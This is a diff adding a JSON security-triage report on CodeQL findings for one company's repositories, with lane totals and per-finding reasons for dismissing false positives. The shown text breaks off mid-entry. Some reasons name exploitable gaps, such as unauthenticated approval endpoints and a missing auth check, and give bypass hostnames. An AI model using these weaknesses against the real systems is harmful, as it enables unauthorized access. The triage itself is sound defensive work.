@@ -1,0 +1,1859 @@
+{
+ "lanes": [
+  {
+   "lane": "clear-text-logging",
+   "expected": 70,
+   "examined": 70,
+   "real": 13,
+   "fp": 55,
+   "uncertain": 2,
+   "verify_seat": "glm",
+   "overturned": 11
+  },
+  {
+   "lane": "path-injection",
+   "expected": 46,
+   "examined": 46,
+   "real": 26,
+   "fp": 20,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 0
+  },
+  {
+   "lane": "url-substring-sanitization",
+   "expected": 38,
+   "examined": 38,
+   "real": 5,
+   "fp": 33,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 1
+  },
+  {
+   "lane": "injection-tail",
+   "expected": 25,
+   "examined": 25,
+   "real": 6,
+   "fp": 19,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 1
+  },
+  {
+   "lane": "redos",
+   "expected": 23,
+   "examined": 23,
+   "real": 8,
+   "fp": 15,
+   "uncertain": 0,
+   "verify_seat": "codex",
+   "overturned": 4
+  },
+  {
+   "lane": "overly-permissive-file",
+   "expected": 22,
+   "examined": 22,
+   "real": 0,
+   "fp": 22,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 0
+  },
+  {
+   "lane": "transport-and-hashing",
+   "expected": 14,
+   "examined": 14,
+   "real": 6,
+   "fp": 8,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 1
+  },
+  {
+   "lane": "insecure-randomness",
+   "expected": 13,
+   "examined": 13,
+   "real": 10,
+   "fp": 3,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 0
+  },
+  {
+   "lane": "ssrf",
+   "expected": 11,
+   "examined": 11,
+   "real": 0,
+   "fp": 11,
+   "uncertain": 0,
+   "verify_seat": "glm",
+   "overturned": 4
+  }
+ ],
+ "totals": {
+  "findings": 262,
+  "real": 74,
+  "fp_claimed": 186,
+  "fp_overturned_by_verify": 22,
+  "uncertain": 2
+ },
+ "safe_to_dismiss": [
+  {
+   "number": 7981,
+   "path": "scripts/docs_audit.py",
+   "line": 1641,
+   "reason": "payload is a docs-inventory report dict (path/status/mtime/drift/action per doc row) built entirely in this function. No variable named/containing 'secret' exists anywhere in the file (grep confirmed) \u2014 CodeQL's 'secret' tag doesn't correspond to any credential-shaped value here."
+  },
+  {
+   "number": 7449,
+   "path": "infra/claude-hooks/host_boundary.py",
+   "line": 228,
+   "reason": "'secret' is a pathlib.Path returned by _read_hits_secret() \u2014 the FILE PATH of a secret-ish file being read (e.g. .env), not the file's contents/value. Confirmed by reading _read_hits_secret(): it only returns `resolved` (a Path), never file content."
+  },
+  {
+   "number": 7375,
+   "path": "scripts/cost_ledger_export.py",
+   "line": 266,
+   "reason": "_redact_dsn() explicitly masks the password segment of the DSN with '***' before the value reaches the logger (verified: creds.split(':',1)[0] + ':***@' + hostpart). CodeQL's static analysis doesn't model this sanitizer function's semantics."
+  },
+  {
+   "number": 6855,
+   "path": "apps/backend-rag/backend/app/services/hr/hr_service.py",
+   "line": 662,
+   "reason": "Only logs an internal numeric employee_id (DB foreign key) and a day count \u2014 no name, email, or other identifying content. Not a secret/password/credential; low-sensitivity operational audit log in an internal HR endpoint."
+  },
+  {
+   "number": 6449,
+   "path": "apps/backend-rag/backend/app/routers/cron_notifiers.py",
+   "line": 136,
+   "reason": "Traced result back to BirthdayNotifierService.run_birthday_notifications(): it returns only a stats dict {date, birthdays_found, sent, failed, error?} \u2014 aggregate counters, never client names/emails."
+  },
+  {
+   "number": 6375,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 180,
+   "reason": "Logs a company business email (e.g. surya@balizero.com, hardcoded in this same file's EMPLOYEE_EMAILS dict) to a local logfile on an internal Tailscale-only admin tool. Low-sensitivity business address, not attacker-reachable, not a credential."
+  },
+  {
+   "number": 6374,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 175,
+   "reason": "Same as #6375 \u2014 logs a known internal business email in a local admin tool's logfile."
+  },
+  {
+   "number": 6373,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 163,
+   "reason": "employee is the exact string the HTTP caller submitted (echoed back), just lowercased/stripped \u2014 not a server-side secret, and the tool is Tailscale-internal only (per file header)."
+  },
+  {
+   "number": 6372,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 134,
+   "reason": "Logs internal business email + exception on a local admin-only monitoring tool; not a credential/secret."
+  },
+  {
+   "number": 6371,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 99,
+   "reason": "text is the constructed employee-checkout alert message (short employee id, timestamps, hostname) \u2014 this is the exact content sent to the team's own Telegram channel, not a secret being disclosed to anyone new."
+  },
+  {
+   "number": 6370,
+   "path": "scripts/profile-monitor/wrapper.py",
+   "line": 90,
+   "reason": "Despite the word 'credentials' in the surrounding string, `text` is the alert message body (not the Telegram token) \u2014 the token itself is never interpolated into any log statement in this file."
+  },
+  {
+   "number": 5982,
+   "path": "apps/cell/cell/sensors/oauth_health_sensor.py",
+   "line": 134,
+   "reason": "last_check_iso is a timestamp string read from a local watchdog state JSON file, not an OAuth token/credential. Classification appears to be name-heuristic bleed from 'OAuth' in the class/field names, not an actual secret value."
+  },
+  {
+   "number": 5981,
+   "path": "scripts/drive_token_watchdog.py",
+   "line": 227,
+   "reason": "Traced the one plausible tainted call site: expires_str comes from token_data['expires_at'], and _check_drive_token_via_fly()'s SQL only ever SELECTs expires_at/created_at columns from google_drive_tokens \u2014 the actual OAuth token/refresh_token value is never fetched or logged anywhere in this script. 'token_data'/'token_watchdog' naming likely drives CodeQL's heuristic, not real token content."
+  },
+  {
+   "number": 5522,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 1481,
+   "reason": "Only interpolates evidence_score, a float confidence metric. No secret/credential value is present; CodeQL's '(secret)' tag doesn't match any variable in scope."
+  },
+  {
+   "number": 5521,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 1401,
+   "reason": "Interpolates evidence_score (float) and intent_type (a small enum-like classification string, e.g. 'simple'/'critical'). Not secret data."
+  },
+  {
+   "number": 5520,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 1458,
+   "reason": "evidence_score/intent_type/domain_type are internal scoring/classification values, not secrets."
+  },
+  {
+   "number": 5519,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 1531,
+   "reason": "Only evidence_score (float) is logged. No secret."
+  },
+  {
+   "number": 5518,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 1388,
+   "reason": "Same evidence/intent/domain classification values, not secrets \u2014 sync-pipeline twin of #5520."
+  },
+  {
+   "number": 5517,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 834,
+   "reason": "Only evidence_score (float). Not secret data."
+  },
+  {
+   "number": 5516,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 777,
+   "reason": "Same as #5522, non-streaming pipeline twin. Not secret data."
+  },
+  {
+   "number": 5515,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 753,
+   "reason": "Same classification values as #5520, non-streaming twin. Not secret data."
+  },
+  {
+   "number": 5514,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 684,
+   "reason": "Non-streaming twin of #5521. Not secret data."
+  },
+  {
+   "number": 5513,
+   "path": "apps/backend-rag/backend/services/rag/agentic/reasoning.py",
+   "line": 671,
+   "reason": "Non-streaming twin of #5518. evidence_score/intent_type/domain_type are not secrets."
+  },
+  {
+   "number": 5512,
+   "path": "apps/backend-rag/backend/services/bridge/low_confidence_emitter.py",
+   "line": 87,
+   "reason": "key is a truncated SHA256 hash prefix of the query (irreversible), confidence is a float score. The raw query text itself is never passed to this log call. No secret data."
+  },
+  {
+   "number": 5511,
+   "path": "apps/backend-rag/backend/services/rag/agentic/_reasoning_evidence.py",
+   "line": 159,
+   "reason": "log_prefix is a hardcoded default string ('Evidence'); EVIDENCE_SCORE_TRUSTED_TOOL is a module-level float constant (e.g. 0.85). Neither is a secret."
+  },
+  {
+   "number": 5127,
+   "path": "apps/backend-rag/scripts/backfill_leave_2026.py",
+   "line": 129,
+   "reason": "One-off local admin CLI backfill script (dry-run/manual), printing a known employee business email + internal DB id to the operator's own terminal. Not attacker-reachable, not a credential."
+  },
+  {
+   "number": 4676,
+   "path": "apps/backend-rag/backend/app/utils/internal_api_auth.py",
+   "line": 36,
+   "reason": "Only the first 4 characters of a rejected/invalid API key are logged \u2014 deliberate partial masking for abuse-detection correlation, not full-key disclosure."
+  },
+  {
+   "number": 4290,
+   "path": "apps/evaluator/nlm_deep_research/db_to_nlm_sync.py",
+   "line": 409,
+   "reason": "Every call site (grep-confirmed) passes a module-level SQL constant (SQL_CLIENT_STATS, SQL_NATIONALITIES, etc.) with parameterized placeholders ($1,$2) \u2014 the bound argument VALUES (*args) are never logged, only the static query template text."
+  },
+  {
+   "number": 3767,
+   "path": "apps/backend-rag/backend/services/crm/welcome/welcome_whatsapp_service.py",
+   "line": 145,
+   "reason": "Only logs the internal numeric client_id and a language code \u2014 the phone number and access_token used earlier in the function are NOT part of this log call."
+  },
+  {
+   "number": 3652,
+   "path": "apps/backend-rag/scripts/normalize_nationalities.py",
+   "line": 368,
+   "reason": "old/target are distinct categorical nationality VALUES (e.g. 'Italian') shared across many client rows, printed with an aggregate count \u2014 not tied to any individual client, in a local one-off DB-cleanup script."
+  },
+  {
+   "number": 3651,
+   "path": "apps/backend-rag/scripts/normalize_nationalities.py",
+   "line": 359,
+   "reason": "Same as #3652 \u2014 prints a distinct nationality category value + count, not individual client data."
+  },
+  {
+   "number": 3449,
+   "path": "apps/backend-rag/scripts/verify_sendgrid.py",
+   "line": 41,
+   "reason": "Deliberately masked (only 10+4=14 chars of a ~69-char SendGrid key shown, majority hidden with '...'), local diagnostic CLI script run by the operator who already holds the full key in their own env."
+  },
+  {
+   "number": 3146,
+   "path": "apps/backend-rag/scripts/test_gemini_key_prefix.py",
+   "line": 19,
+   "reason": "Only a 10-char prefix of a Gemini API key is printed by a throwaway local dev diagnostic script; the operator running it already possesses the full key via their own environment \u2014 no new disclosure."
+  },
+  {
+   "number": 3145,
+   "path": "apps/backend-rag/scripts/test_gemini_key_new.py",
+   "line": 19,
+   "reason": "Same pattern as #3146 \u2014 local one-off key-test script, 10-char prefix only."
+  },
+  {
+   "number": 3144,
+   "path": "apps/backend-rag/scripts/test_gemini_key_final.py",
+   "line": 19,
+   "reason": "Same pattern as #3146."
+  },
+  {
+   "number": 3142,
+   "path": "apps/backend-rag/scripts/test_gemini_key_15_final.py",
+   "line": 19,
+   "reason": "Same pattern as #3146."
+  },
+  {
+   "number": 3141,
+   "path": "apps/backend-rag/scripts/test_gemini_key_15.py",
+   "line": 19,
+   "reason": "Same pattern as #3146."
+  },
+  {
+   "number": 2833,
+   "path": "apps/backend-rag/backend/app/modules/notifications/templates.py",
+   "line": 589,
+   "reason": "alert_type is an AlertType enum and language is a 2-letter locale code (e.g. 'en'/'id') \u2014 neither is sensitive."
+  },
+  {
+   "number": 2832,
+   "path": "apps/backend-rag/backend/app/modules/notifications/templates.py",
+   "line": 584,
+   "reason": "Same as #2833 \u2014 enum + locale code, not sensitive."
+  },
+  {
+   "number": 2363,
+   "path": "apps/backend-rag/scripts/test_gemini_key.py",
+   "line": 9,
+   "reason": "Same 10-char-prefix pattern as #3146, oldest/simplest of the six near-duplicate test scripts."
+  },
+  {
+   "number": 292,
+   "path": "apps/backend-rag/backend/app/auth/validation.py",
+   "line": 46,
+   "reason": "Explicitly masked (only 8-char prefix, and literally labeled '(masked)' in the log message itself) \u2014 standard practice for correlating failed-auth attempts without disclosing the credential."
+  },
+  {
+   "number": 278,
+   "path": "apps/backend-rag/scripts/list_models.py",
+   "line": 10,
+   "reason": "Same 10-char-prefix pattern as the test_gemini_key* scripts \u2014 local one-off diagnostic script, operator already holds the full key."
+  },
+  {
+   "number": 277,
+   "path": "apps/evaluator/judgement_day.py",
+   "line": 248,
+   "reason": "Same 10-char-prefix pattern, local RAGAS evaluation CLI script."
+  },
+  {
+   "number": 264,
+   "path": "apps/backend-rag/backend/services/misc/autonomous_scheduler.py",
+   "line": 421,
+   "reason": "stats.get('sent', 0) is a numeric count from run_birthday_notifier_task() (verified: returns only aggregate {date, birthdays_found, sent, failed}), not any client PII."
+  },
+  {
+   "number": 7792,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 174,
+   "reason": "This is inside save_staging_item()'s cleanup-on-error branch. I enumerated every production caller of save_staging_item (grep across the whole backend): intel.py edit_staging_item and upload_cover_image both take item_id from a single FastAPI URL path segment ({type}/{item_id}), which Starlette's default 'str' convertor regex '[^/]+' structurally forbids from containing '/', so no traversal is possible through that source (verified against the installed starlette/convertors.py). The only other callers are intel_scraper.py's two save_staging_item() calls, both passed item_id generated server-side by generate_item_id() (a fixed '{type}_{timestamp}_{hash}' format) \u2014 never attacker text. No call site threads a JSON-body-sourced item_id into save_staging_item."
+  },
+  {
+   "number": 7791,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 172,
+   "reason": "Same save_staging_item() call-site analysis as 7792 \u2014 all reachable item_id values are Starlette single-URL-segment (no '/' possible) or server-generated."
+  },
+  {
+   "number": 7790,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 168,
+   "reason": "Same save_staging_item() call-site analysis as 7792."
+  },
+  {
+   "number": 7789,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 165,
+   "reason": "Same save_staging_item() call-site analysis as 7792."
+  },
+  {
+   "number": 7788,
+   "path": "apps/backend-rag/backend/services/intel/intel_approval_service.py",
+   "line": 276,
+   "reason": "_save_voting_status(item_id, ...) is only called from send_approval_notification(), whose two production callers are intel.py:393 (approve_staging_item \u2014 item_id from a single URL path segment, cannot contain '/') and chains/intel.py:219 (a background workflow that pulls item_id from list_pending_items(), i.e. server-derived file stems, not external text). No path threads attacker-supplied body text into this write."
+  },
+  {
+   "number": 7787,
+   "path": "apps/backend-rag/backend/app/routers/intel.py",
+   "line": 531,
+   "reason": "cover_path = covers_dir / f'{item_id}{ext}'. item_id is a single FastAPI URL path segment ({type}/{item_id}/cover) \u2014 Starlette's 'str' convertor forbids '/', verified against installed starlette source. ext = PathLib(request.cover_image_filename).suffix \u2014 Path.suffix is derived from Path.name (the final path component only) and by construction can never contain a '/'. Neither taint component can escape covers_dir. (Note: this endpoint lacks Depends(get_current_user) unlike its siblings \u2014 a real but separate missing-authorization issue, not a path-injection one.)"
+  },
+  {
+   "number": 7588,
+   "path": "skills/bali-zero-brand/_damar-queue-server.py",
+   "line": 577,
+   "reason": "target = slides_dir / filename is immediately guarded (lines 571-575) by target.resolve().relative_to(slides_dir.resolve()) wrapped in try/except ValueError -> 403 'path traversal blocked', which runs and returns BEFORE this read. Any '../' in filename raises ValueError and the function returns 403 without reaching line 577. This is the canonical resolve()+relative_to() traversal guard; CodeQL's local dataflow doesn't model the exception-based short-circuit. Also a loopback-only local tool ('binds to 127.0.0.1 explicitly. No external exposure.')."
+  },
+  {
+   "number": 7587,
+   "path": "skills/bali-zero-brand/_damar-queue-server.py",
+   "line": 576,
+   "reason": "Same resolve()/relative_to() guard as 7588 runs immediately before this line; a traversal filename never reaches it."
+  },
+  {
+   "number": 7586,
+   "path": "skills/bali-zero-brand/_damar-queue-server.py",
+   "line": 572,
+   "reason": "This IS the sanitizer call itself, not an unguarded sink \u2014 CodeQL is flagging the resolve() call because target was built from tainted filename, but resolve()/relative_to() is precisely the mitigation (raises ValueError -> 403 on escape, caught at lines 573-575). No file I/O happens at this line."
+  },
+  {
+   "number": 2761,
+   "path": "apps/backend-rag/backend/app/routers/preview.py",
+   "line": 80,
+   "reason": "payload.article_id is explicitly passed through _validate_article_id() (line 63) before preview_path is built (line 69) and before this write \u2014 the validator enforces ^[a-zA-Z0-9_-]+$ with a 128-char cap and raises HTTPException(400) on any other character (including '/', '.', '\\\\'). No traversal character can survive to reach this sink."
+  },
+  {
+   "number": 378,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 809,
+   "reason": "get_approval_status(article_id) \u2014 article_id is a single FastAPI/Starlette URL path segment (@app.get('/api/v1/approval/{article_id}')); Starlette's default 'str' convertor regex '[^/]+' structurally forbids a literal '/', so pending_path = PENDING_DIR/f'{article_id}.json' cannot escape PENDING_DIR regardless of the missing app-level auth. (Separately: this whole FastAPI app has zero authentication on any route \u2014 a genuine IDOR/missing-authz issue letting anyone read/approve/reject any article by guessing its id \u2014 but that is not a path-traversal/path-injection issue.)"
+  },
+  {
+   "number": 377,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 806,
+   "reason": "Same get_approval_status() analysis as 378 \u2014 article_id is a single URL path segment, cannot contain '/'."
+  },
+  {
+   "number": 376,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 778,
+   "reason": "reject_article(article_id) \u2014 article_id is a single URL path segment (@app.post('/api/v1/approval/{article_id}/reject')), cannot contain '/'; the written path stays inside PENDING_DIR regardless of the app's missing auth."
+  },
+  {
+   "number": 375,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 768,
+   "reason": "Same reject_article() analysis as 376."
+  },
+  {
+   "number": 374,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 764,
+   "reason": "Same reject_article() analysis as 376."
+  },
+  {
+   "number": 373,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 732,
+   "reason": "approve_article(article_id) \u2014 article_id is a single URL path segment (@app.post('/api/v1/approval/{article_id}/approve')), cannot contain '/'."
+  },
+  {
+   "number": 372,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 717,
+   "reason": "Same approve_article() analysis as 373."
+  },
+  {
+   "number": 371,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 713,
+   "reason": "Same approve_article() analysis as 373."
+  },
+  {
+   "number": 369,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 637,
+   "reason": "get_preview(article_id) \u2014 article_id is a single URL path segment (@app.get('/preview/{article_id}')), Starlette forbids '/' in it, so preview_path stays inside PREVIEW_DIR."
+  },
+  {
+   "number": 368,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 632,
+   "reason": "Same get_preview() analysis as 369."
+  },
+  {
+   "number": 6286,
+   "path": "apps/backend-rag/backend/tests/unit/services/canva_renderer_v2/test_telegram.py",
+   "line": 15,
+   "reason": "This is a unit-test assertion verifying the URL the code under test built, against a mocked/fake urlopen call \u2014 there is no attacker-controlled input and no security decision (allow/deny, redirect, sanitize) being made here at all; it is a test oracle, never executed in production, over a value the test itself fully controls the shape of."
+  },
+  {
+   "number": 6000,
+   "path": "apps/backend-rag/backend/tests/unit/services/notifications/test_resend_http.py",
+   "line": 69,
+   "reason": "Test assertion checking the mocked HTTP payload built by the code under test contains the expected default From address. No attacker-controlled input, no security-gating logic \u2014 pure test-oracle string containment on a fixed test payload."
+  },
+  {
+   "number": 5797,
+   "path": "apps/mouth/e2e/visa-funnel-fusion.spec.ts",
+   "line": 82,
+   "reason": "baseURL comes from the Playwright project config (test.info().project.use?.baseURL), set by the developer/CI, not by any external request; it only decides whether to skip an E2E test locally vs against a deployed preview. No security decision, no untrusted input."
+  },
+  {
+   "number": 5691,
+   "path": "apps/mata-garuda/tests/test_goid_harvesters.py",
+   "line": 43,
+   "reason": "This is a guilt/innocence unit-test assertion verifying that the real extract_links() function under test correctly DROPPED a malicious link \u2014 it is checking a security property holds, not implementing an insecure check itself. `urls` is the test-controlled output of a function call in the same test, never reachable by an external attacker."
+  },
+  {
+   "number": 5608,
+   "path": "apps/backend-rag/backend/tests/services/publisher/test_x_publisher.py",
+   "line": 83,
+   "reason": "Test assertion over tweets generated from a hardcoded test draft (d.link_url = \"https://balizero.com/kbli/...\" set two lines above) \u2014 pure test-oracle, no attacker input, no security gate."
+  },
+  {
+   "number": 5607,
+   "path": "apps/backend-rag/backend/tests/services/publisher/test_linkedin_publisher.py",
+   "line": 115,
+   "reason": "Test assertion on a mocked HTTP client's captured call body, built from a hardcoded test draft. No untrusted input, no security check."
+  },
+  {
+   "number": 5491,
+   "path": "packages/core/auth/session-bridge.ts",
+   "line": 40,
+   "reason": "Real code-shape bug (endsWith without a dot boundary would also match \"evilbalizero.com\"), but not exploitable: for this branch to matter, the script would have to be executing on a page whose document.location.hostname is literally something like \"evilbalizero.com\" \u2014 i.e. the attacker already owns that domain and is running Bali Zero's own client bundle there. Even then, the browser's own cookie-domain-match rules (RFC 6265) reject a Set-Cookie/document.cookie write with Domain=.balizero.com from a document whose host isn't balizero.com or a true subdomain (dot-bounded) of it, so the cookie write this gates is silently dropped by the browser regardless of the substring bug. location.hostname is not attacker-controlled input in the traditional sense here."
+  },
+  {
+   "number": 5120,
+   "path": "apps/mata-garuda/mata_garuda/workers/nlm_feeder.py",
+   "line": 463,
+   "reason": "url comes from internally harvested KB items (item.get(\"source\")), so it is influenceable by whatever content mata-garuda's harvesters ingest, and the arxiv.org prefix check is technically bypassable (\"http://arxiv.org.evil.com\"). But the check does not gate a privileged vs unprivileged action: both branches of the if/else (this line, and the `else` that calls _nlm_add_text) end up feeding the exact same untrusted URL/content into NotebookLM as a source via the `nlm` CLI \u2014 there is no security boundary being crossed, only a routing choice between two equally-untrusted ingestion calls. Also the second disjunct `url.startswith(\"https://\")` already accepts virtually any https URL, making the arxiv-specific branch functionally redundant as a gate."
+  },
+  {
+   "number": 4983,
+   "path": "apps/backend-rag/backend/tests/unit/services/crm/test_practice_status_listener.py",
+   "line": 55,
+   "reason": "Test assertion on the return value of _milestone_content(), a pure string-building function invoked with hardcoded test args two lines above \u2014 no untrusted input, no security decision."
+  },
+  {
+   "number": 4982,
+   "path": "apps/backend-rag/backend/tests/unit/services/ingestion/test_legal_full_ingestion_worker.py",
+   "line": 279,
+   "reason": "result comes from a fully mocked Google Drive API response (mock_service.files().create().execute.return_value set 15 lines above to a fixed webViewLink) \u2014 test-oracle check, no untrusted input."
+  },
+  {
+   "number": 4981,
+   "path": "apps/backend-rag/backend/tests/unit/services/integrations/test_google_drive_service.py",
+   "line": 123,
+   "reason": "url = svc.get_authorization_url(state=\"csrf-token-123\") called two lines above with fixed test args \u2014 asserting the OAuth URL builder produced the expected host. No attacker-controlled input reaches this check; it is validating the code under test's own output."
+  },
+  {
+   "number": 4480,
+   "path": "apps/backend-rag/backend/tests/unit/channels/test_whatsapp_adapter.py",
+   "line": 332,
+   "reason": "url = adapter.client.post.call_args.args[0], captured from a mocked AsyncMock HTTP client \u2014 verifying the adapter posts to the expected Graph API endpoint. Test-oracle assertion, no untrusted input."
+  },
+  {
+   "number": 4016,
+   "path": "tests/nlm_deep_research/test_t4_monitor.py",
+   "line": 165,
+   "reason": "articles come from parsing a hardcoded WEBSITE_SAMPLE fixture through a fully mocked httpx.AsyncClient \u2014 deterministic test data, not attacker input. Test-oracle assertion."
+  },
+  {
+   "number": 3596,
+   "path": "apps/backend-rag/backend/tests/services/integrations/test_google_drive_service.py",
+   "line": 105,
+   "reason": "Same pattern as #4981 (different test file/directory, same underlying GoogleDriveService.get_authorization_url test) \u2014 url built from hardcoded test args, asserting expected host in the code's own generated OAuth URL. No untrusted input."
+  },
+  {
+   "number": 2939,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 45,
+   "reason": "origins is the return value of get_allowed_origins(), a Python list[str] of CORS origins \u2014 `in` here is list-membership testing, not a substring check on a single URL string, so the incomplete-url-substring-sanitization pattern does not even apply semantically. It is also a pure test-oracle assertion against a mocked settings object, never attacker-reachable."
+  },
+  {
+   "number": 2938,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 44,
+   "reason": "Same list-membership pattern as #2939, same function/test."
+  },
+  {
+   "number": 2937,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 43,
+   "reason": "Same list-membership pattern as #2939, same function/test."
+  },
+  {
+   "number": 2936,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 32,
+   "reason": "Same list-membership pattern (get_allowed_origins() returns list[str]), different test method in the same class."
+  },
+  {
+   "number": 2935,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config.py",
+   "line": 64,
+   "reason": "Same list-membership test-oracle pattern as the *_comprehensive.py sibling file, against get_allowed_origins()."
+  },
+  {
+   "number": 2934,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config.py",
+   "line": 43,
+   "reason": "Same list-membership pattern as #2935."
+  },
+  {
+   "number": 2933,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config.py",
+   "line": 42,
+   "reason": "Same list-membership pattern as #2935."
+  },
+  {
+   "number": 2932,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config.py",
+   "line": 41,
+   "reason": "Same list-membership pattern as #2935."
+  },
+  {
+   "number": 2791,
+   "path": "apps/bali-intel-scraper/scripts/gemini_image_generator.py",
+   "line": 572,
+   "reason": "test_page.url reflects the actual navigation state of a Playwright browser instance the script itself just drove with page.goto(GEMINI_URL) \u2014 it detects Google's own login redirect to decide whether the operator's saved cookies are stale. It is not attacker-supplied network input in any adversarial sense (no external party controls where this local, single-operator Pro-only tool navigates), and misclassification only causes a functional false abort/continue in a local content-generation script, not a privilege or data exposure issue."
+  },
+  {
+   "number": 2790,
+   "path": "apps/bali-intel-scraper/scripts/gemini_image_generator.py",
+   "line": 428,
+   "reason": "Same reasoning as #2791 \u2014 same login-state detection idiom, same local single-operator browser-automation tool, no adversarial input path."
+  },
+  {
+   "number": 2143,
+   "path": "apps/mouth/e2e/knowledge/downloads.spec.ts",
+   "line": 142,
+   "reason": "url = newPage.url() inside a Playwright E2E test's own `context.on(\"page\", ...)` handler, observing navigation during a controlled test run against the app under test \u2014 not attacker-facing production logic, purely a test assertion helper."
+  },
+  {
+   "number": 311,
+   "path": "apps/backend-rag/tests/integration/test_main_cloud_integration.py",
+   "line": 37,
+   "reason": "origins = _allowed_origins() return value, asserted with isinstance(origins, list) on the line above \u2014 list-membership test-oracle check on a mocked settings object, not attacker-reachable code."
+  },
+  {
+   "number": 310,
+   "path": "apps/backend-rag/backend/tests/unit/middleware/test_hybrid_auth.py",
+   "line": 72,
+   "reason": "origins = _allowed_origins() (list[str]) computed under a patched settings context 2 lines above \u2014 list-membership test assertion, no untrusted input."
+  },
+  {
+   "number": 309,
+   "path": "apps/backend-rag/backend/tests/unit/middleware/test_hybrid_auth.py",
+   "line": 71,
+   "reason": "Same list-membership pattern and same test as #310."
+  },
+  {
+   "number": 307,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 80,
+   "reason": "Same get_allowed_origins() list-membership test-oracle pattern as the other test_cors_config* findings, different test method (filters_empty)."
+  },
+  {
+   "number": 306,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 79,
+   "reason": "Same list-membership pattern as #307."
+  },
+  {
+   "number": 305,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 67,
+   "reason": "Same list-membership pattern as #307, different test method (strips_whitespace)."
+  },
+  {
+   "number": 304,
+   "path": "apps/backend-rag/backend/tests/unit/app/setup/test_cors_config_comprehensive.py",
+   "line": 66,
+   "reason": "Same list-membership pattern as #307."
+  },
+  {
+   "number": 8025,
+   "path": "apps/wa-mirror/scripts/wa-tester.ts",
+   "line": 487,
+   "reason": "outPath defaults to a predictable name in the shared /tmp (`/tmp/wa-tester-transcript-${Date.now()}.json`, parseArgs() line 516), which is a genuine CWE-377 pattern, but this is a manual, on-demand CLI ('tsx scripts/wa-tester.ts --send-battery ...') run only by Zero on his own single-user macOS dev machines. The symlink-preplant race this rule protects against requires a hostile co-tenant with write access to the same temp dir, which does not exist in this deployment."
+  },
+  {
+   "number": 7980,
+   "path": "scripts/docs_audit.py",
+   "line": 1649,
+   "reason": "new_content = render_inventory(rows, clusters) is a rendered markdown table of documentation file paths/status/mtime/drift flags collected by scanning docs/**. There is no literal 'secret' anywhere in the file (grep -i secret: 0 hits) and no credential value ever flows into `rows`. CodeQL's sensitive-data classifier fired on a name/content heuristic (most likely a doc filename token) rather than a genuine credential value."
+  },
+  {
+   "number": 7786,
+   "path": "packages/cell-core/cell_core/identity.py",
+   "line": 87,
+   "reason": "self.model.to_dict() only returns capabilities/preferences/weaknesses/personality_traits/sensor_history/age_days/total_pulses/total_actions/birth_date \u2014 organism self-model telemetry, no credential. grep -i 'priv' over the whole file returns 0 hits, and the only caller of SelfModelManager found in the repo is test code. The 'private' classification does not correspond to any real field name here."
+  },
+  {
+   "number": 7785,
+   "path": "scripts/drive_token_watchdog.py",
+   "line": 197,
+   "reason": "Traced main(): `new_state` is built only from tier-classification strings (last_oauth_tier, last_oauth_check_iso, last_oauth_days_left, last_sa_alert_age) plus the prior state dict \u2014 never from `env`, `bot_token`, or `token_data` (which itself only carries expires_at/created_at, never a credential). grep -i password over the file: 0 hits. No password-shaped value is ever assigned into `state`; the 5x repeated 'password' classification appears to be an over-approximation by CodeQL's name heuristic (likely triggered near TELEGRAM_BOT_TOKEN/env handling) rather than a genuine flow into this sink."
+  },
+  {
+   "number": 7406,
+   "path": "apps/mouth/e2e/category-alias-redirect.spec.ts",
+   "line": 52,
